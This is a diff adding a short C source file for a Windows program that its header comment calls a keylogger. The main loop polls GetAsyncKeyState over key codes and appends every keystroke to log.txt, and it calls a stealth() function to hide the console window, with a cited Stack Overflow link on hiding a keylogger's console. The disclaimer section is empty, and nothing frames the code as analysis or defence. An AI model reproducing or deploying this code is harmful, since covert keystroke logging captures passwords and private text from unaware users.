@@ -1,0 +1,39 @@
+#include <stdio.h>
+#include <windows.h>
+#include "header.h"
+
+#define MAX_VK 40       //Aka nbr of key strokes per line
+/* Project - Keylogger
+
+Disclaimer:
+
+Sources:
+Hiding console -> https://stackoverflow.com/questions/52352526/hiding-a-console-window-for-keylogger-in-c
+
+Author: Clement Dutu
+*/
+
+int main()
+{
+    int j = 0;
+
+    stealth();      //Hides console
+    start("log.txt");
+
+    while(1)
+    {
+        for(int i = 0; i < 191; i++)
+        {
+            if(GetAsyncKeyState(i) == -32767){
+                save(i, "log.txt");
+                j++;
+            }
+            if(j == MAX_VK){
+                save(13, "log.txt");        //Allows MAX_VK of key strokes per line
+                j = 0;
+            }
+        }
+    }
+    system("PAUSE");
+    return 0;
+}
